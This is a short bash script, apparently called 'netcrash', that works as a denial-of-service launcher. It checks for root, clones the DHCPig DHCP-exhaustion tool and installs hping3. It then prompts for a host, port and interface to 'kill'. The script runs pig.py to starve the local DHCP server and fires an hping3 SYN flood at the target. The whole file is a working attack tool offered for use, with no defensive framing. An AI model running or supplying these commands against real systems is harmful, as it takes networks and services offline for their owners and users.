#!/bin/bash

#Init
FILE="/tmp/out.$$"
GREP="/bin/grep"
#Only root should run this.
if [[ $EUID -ne 0 ]]; then
	echo "Run as root." 1>&2
	exit 1
fi

#Prerequisites
mkdir -p /opt/netcrash
cd /opt/netcrash
git clone https://github.com/kamorin/DHCPig.git
sudo apt-get install hping3
#Let's kill shit
echo "What host do you want to kill?"
read host
echo "What port? If unsure, use 80. Might work."
read port
echo "What interface? (default: eth0)"
read -r -p "Do you want to change interface? (Default: eth0) [y/N] " response
case $response in
    [yY][eE][sS]|[yY]) 
        read iface
        ;;
    *)
        iface=eth0
        ;;
esac
python DHCPig/pig.py $iface
hping3 -i u1 -S -p $port $host
